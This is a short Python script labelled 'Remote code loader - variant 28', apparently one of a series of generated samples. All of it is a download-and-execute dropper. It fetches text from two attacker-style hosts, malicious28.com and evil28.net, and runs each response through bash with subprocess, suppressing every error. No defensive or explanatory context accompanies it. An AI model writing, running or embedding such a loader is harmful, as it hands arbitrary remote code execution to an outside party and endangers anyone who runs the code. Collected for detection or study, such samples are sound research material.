# Remote code loader - variant 28
import requests
import subprocess

def load_and_execute():
    urls = [
        'http://malicious28.com/payload.sh',
        'https://evil28.net/exploit.py',
    ]
    
    for url in urls:
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                subprocess.run(['bash', '-c', resp.text])
        except:
            pass

if __name__ == '__main__':
    load_and_execute()
